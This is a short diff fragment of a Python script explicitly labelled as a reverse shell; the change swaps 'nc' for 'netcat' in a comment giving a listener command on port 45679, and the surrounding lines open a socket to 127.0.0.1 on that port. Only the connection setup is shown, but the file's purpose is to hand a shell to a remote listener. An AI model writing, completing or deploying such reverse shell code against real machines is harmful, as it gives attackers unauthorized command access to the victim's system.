@@ -3,7 +3,7 @@ import subprocess
 import os
 
 # REVERSE SHELL
-# NEEDS OPEN PORT I.e. nc -p 45679 -v -l -k
+# NEEDS OPEN PORT I.e. netcat -p 45679 -v -l -k
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("127.0.0.1", 45679))
